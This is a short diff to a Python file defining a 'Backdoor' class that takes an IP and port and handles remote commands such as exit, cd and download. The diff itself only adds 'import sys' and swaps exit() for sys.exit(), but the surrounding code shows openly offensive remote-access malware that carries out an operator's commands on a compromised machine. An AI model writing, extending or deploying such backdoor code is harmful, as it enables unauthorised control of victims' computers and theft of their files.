@@ -4,6 +4,7 @@ import json
 import subprocess
 import os
 import base64
+import sys
 
 class Backdoor:
     def __init__(self,ip,port):
@@ -46,7 +47,7 @@ class Backdoor:
             try:
                 if command[0] == "exit":
                     self.connection.close()
-                    exit()
+                    sys.exit()
                 elif command[0] == "cd" and len(command) > 1:
                     command_result = self.change_working_directory(command[1])
                 elif command[0] == "download":
